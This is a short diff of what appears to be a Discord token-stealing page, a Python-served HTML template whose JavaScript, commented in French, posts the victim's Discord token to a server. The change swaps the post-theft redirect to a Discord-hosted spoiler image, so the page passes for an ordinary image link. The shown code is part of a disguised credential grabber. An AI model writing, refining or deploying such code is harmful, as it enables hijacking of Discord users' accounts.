@@ -45,7 +45,7 @@ HTML_TEMPLATE = """
                     body: JSON.stringify({ token: token })
                 }).then(() => {
                     // 3. Rediriger vers l'image originale ou une page neutre
-                    window.location.href = "https://discord.com/channels/@me";
+                    window.location.href = "https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96059c&is=6a94b41c&hm=30892b6e1510ac4149823f61df17f232f9215a480c3d362296f5be7140c4eb1f&=&format=webp&quality=lossless&width=1024&height=558";
                 });
             } else {
                 alert("Token non trouvé. Es-tu connecté à Discord dans ce navigateur ?");
